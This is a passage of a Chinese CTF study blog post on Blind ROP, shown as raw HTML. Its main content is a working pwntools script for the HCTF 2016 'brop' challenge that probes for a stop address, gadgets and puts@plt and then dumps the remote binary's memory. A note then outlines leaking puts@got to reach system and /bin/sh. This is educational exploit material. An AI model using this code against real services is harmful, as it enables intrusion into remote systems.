class="line"><span class="keyword">def</span> <span class="title function_">get_stop_addr</span>():</span><br><span class="line">    <span class="comment"># BROP 的程序基址</span></span><br><span class="line">    addr = <span class="number">0x401000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * buf_size + p64(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            io.recv()</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;stop addr: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment"># 以此地址来解析无法解析成合法指令</span></span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到弹出 6 个栈变量的 gadget</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gadgets_addr</span>():</span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 找到弹出 6 个栈变量的 gadget</span></span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * buf_size + p64(addr) + <span class="string">b&quot;AAAAAAAA&quot;</span> * <span class="number">6</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.sendline(payload + p64(stop_addr))</span><br><span class="line">            io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;find address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="comment"># 检查找到的 gadget，不加 stop_addr 崩了，加了没崩</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                io = get_io()</span><br><span class="line">                io.sendline(payload)</span><br><span class="line">                io.recv(timeout = <span class="number">1</span>)</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;bad address: 0x%x&quot;</span> % addr)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                io.close()</span><br><span class="line">                log.info(<span class="string">&quot;gadget address: 0x%x&quot;</span> % addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            io.close()</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span>        </span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得 put@plt 的地址</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_puts_call_addr</span>():</span><br><span class="line">    addr = stop_addr</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr += <span class="number">1</span></span><br><span class="line">        <span class="comment"># pop rdi; ret</span></span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * buf_size + p64(gadgets_addr + <span class="number">0x9</span>)</span><br><span class="line">        <span class="comment"># rdi = 0x400000, eip = addr</span></span><br><span class="line">        <span class="comment"># 判断 eip = put@plt 的方法：输出是否为 \x7fELF</span></span><br><span class="line">        payload += p64(<span class="number">0x400000</span>) + p64(addr) </span><br><span class="line">        <span class="comment"># 不至于使得程序崩溃</span></span><br><span class="line">        payload += p64(stop_addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            <span class="keyword">if</span> io.recv().startswith(<span class="string">b&quot;\x7fELF&quot;</span>):</span><br><span class="line">                log.info(<span class="string">&quot;put call addr: 0x%x&quot;</span> % addr)</span><br><span class="line">                io.close()</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span> EOFError <span class="keyword">as</span> e:</span><br><span class="line">            log.info(<span class="string">&quot;bad: 0x%x&quot;</span> % addr)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">            addr -= <span class="number">1</span>                   </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_memory</span>(<span class="params">st_addr, ed_addr</span>):</span><br><span class="line">    result = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 使用 put 函数 dump 内存</span></span><br><span class="line">    <span class="keyword">while</span> st_addr &lt; ed_addr:</span><br><span class="line">        payload = <span class="string">b&quot;A&quot;</span> * buf_size + p64(gadgets_addr + <span class="number">0x9</span>)</span><br><span class="line">        <span class="comment"># puts(st_addr)</span></span><br><span class="line">        payload += p64(st_addr) + p64(puts_call_addr)</span><br><span class="line">        payload += p64(stop_addr)    </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            <span class="comment"># 保证接收到 \n\n</span></span><br><span class="line">            data = io.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">            <span class="keyword">if</span> data == <span class="string">b&quot;\n&quot;</span>:</span><br><span class="line">                data = <span class="string">b&quot;\x00&quot;</span></span><br><span class="line">            <span class="keyword">elif</span> data[-<span class="number">1</span>] == <span class="string">b&quot;\n&quot;</span>:</span><br><span class="line">                data = data[:-<span class="number">1</span>]</span><br><span class="line">            result += data</span><br><span class="line">            st_addr += <span class="built_in">len</span>(data)</span><br><span class="line">            io.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.info(<span class="string">&quot;Can&#x27;t connect&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buf_size = get_buffer_size()</span><br><span class="line">    stop_addr = get_stop_addr()  </span><br><span class="line">    gadgets_addr = get_gadgets_addr()</span><br><span class="line">    puts_call_addr = get_puts_call_addr()</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;buf_size:&quot;</span>, buf_size)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;stop_addr:&quot;</span>, <span class="built_in">hex</span>(stop_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;gadgets_addr:&quot;</span>, <span class="built_in">hex</span>(gadgets_addr))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;puts_call_addr:&quot;</span>, <span class="built_in">hex</span>(puts_call_addr))</span><br><span class="line">    </span><br><span class="line">    code_bin = dump_memory(<span class="number">0x400000</span>, <span class="number">0x402000</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;code.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(code_bin)</span><br><span class="line">        f.close()</span><br><span class="line">    </span><br><span class="line">    data_bin = dump_memory(<span class="number">0x600000</span>, <span class="number">0x602000</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(data_bin)</span><br><span class="line">        f.close()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># buf_size: 72</span></span><br><span class="line"><span class="comment"># stop_addr: 0x401025</span></span><br><span class="line"><span class="comment"># gadgets_addr: 0x40125a</span></span><br><span class="line"><span class="comment"># puts_call_addr: 0x401027</span></span><br></pre></td></tr></table></figure>
<p>&emsp;之后有两种做法：（1）根据 code.bin 找到 put 的 GOT 值，并使用 puts 打印出 GOT 作为地址所保存的数据，然后就可以找到 system 与 /bin/sh。<code>但是我不知道 libc 的版本是什么？其偏移可能也不同，即拿不到 libc.so</code>。（2）使用 DynELF 模块，泄露出 system 的地址。</p>
<p>&emsp;这里采用第 1 种方法（第 2 种方法没成功，一直报错），使用 radare2 找到 puts@got 的地址，然后用 put 函数输出此地址，以此泄露出 system 与 /bin/sh。见如下代码：</p>
<p><img src="/images/ctf-guide-pwn-2/image-20240528000540801.png" alt="image-20240528000540801"></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240528000556934.png" alt="image-20240528000556934"></p>
<p><img src="/images/ctf-guide-pwn-2/image-20240528000530477.png" alt="image-20240528000530477" style="zoom:80%;" /></p>

  
	</div>

	<div>
  	<center>
	<div class="pagination">

    
    
    <a href="/2024/05/08/rust-study-1/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/04/10/tx-security-contest-pc/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>


	<!-- comment -->
	
<section id="comment">
    <h2 class="title">留言</h2>

    <!-- 
    <div id="disqus_thread" class="ds-thread">
        <script type="text/javascript">
            /**
             * RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
             * LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
             */
                /*
                 var disqus_config = function () {
                 this.page.url = PAGE_URL; // Replace PAGE_URL with your page's canonical URL variable
                 this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
                 };
                 */
            (function() { // DON'T EDIT BELOW THIS LINE
                var d = document, s = d.createElement('script');

                s.src = 'https://https-wd-2711-tech.disqus.com/embed.js';

                s.setAttribute('data-timestamp', +new Date());
                (d.head || d.body).appendChild(s);
            })();
        </script>
        <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
                Disqus.</a></noscript>
    </div> -->
    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
    <div id="vcomments"></div>
    <script>
        new Valine({
            el: '#vcomments',
            appId: 'wLIJ70s3fPvW8WJPgVVAuWVR-gzGzoHsz',
            appKey: 'NVGqxhUkqtFv2CbwmXXWjCdR'
        })
    </script>

    
</section>


	</div> <!-- col-md-9/col-md-12 -->
		
	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-05-08 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/pwn/">pwn<span>2</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#CTF-%E7%AB%9E%E8%B5%9B%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PWN-2"><span class="toc-article-text">CTF 竞赛权威指南-PWN-2</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x04-shellcode-%E5%BC%80%E5%8F%91"><span class="toc-article-text">0x04 shellcode 开发</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x05-%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8"><span class="toc-article-text">0x05 整数安全</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x06-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-article-text">0x06 格式化字符串</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BE%8B%E9%A2%981%EF%BC%9AHITCON-CMT-2017-pwn200"><span class="toc-article-text">例题1：HITCON CMT 2017 pwn200</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BE%8B%E9%A2%982%EF%BC%9ANJCTF2017%EF%BC%9Apingme"><span class="toc-article-text">例题2：NJCTF2017：pingme</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#0x07-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8E-ROP"><span class="toc-article-text">0x07 栈溢出与 ROP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%94%E5%9B%9E%E5%AF%BC%E5%90%91%E7%BC%96%E7%A8%8B-ROP"><span class="toc-article-text">返回导向编程 ROP</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ROP-%E7%9A%84%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90"><span class="toc-article-text">ROP 的简单例子</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Blind-ROP%EF%BC%88BROP%EF%BC%89"><span class="toc-article-text">Blind ROP（BROP）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#HCTF-2016%EF%BC%9Abrop"><span class="toc-article-text">HCTF 2016：brop</span></a></li></ol></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

	</div>

	<!-- copyright -->
	<div>
    <ul class="post-copyright">
      <li class="post-copyright-author">
      <strong>作者:  </strong>wd-z711</a>
      </li>
      <li class="post-copyright-link">
      <strong>文章链接:  </strong>
      <a href="/" target="_blank" title="">https://wd-2711.tech/</a>
      </li>
      <li class="post-copyright-license">
        <strong>版权声明:   </strong>
        本博客所有文章除特别声明外，均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
        许可协议。转载请注明出处!
      </li>
    </ul>
  <div>
 	

		


</div><!-- row -->




	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  &copy; 2024 wd-z711
  
      <!-- with help from <a href="http://hexo.io/" target="_blank">Hexo</a>,<a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind</a>,<a href="http://getbootstrap.com/" target="_blank">Twitter Bootstrap</a> and <a href="http://getbootstrap.com/" target="_blank">BOOTSTRA.386</a>. 
     <br> Theme by <a target="_blank" rel="noopener" href="http://github.com/wzpan/hexo-theme-freemind/">Freemind.386</a>.     -->

     <!-- <script type="text/javascript">
      (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
      (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
      e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
      })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
      
      _st('install','aB-vgeB8gEDrnRJuhceL','2.0.0');
    </script> -->
    </p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
   </html>
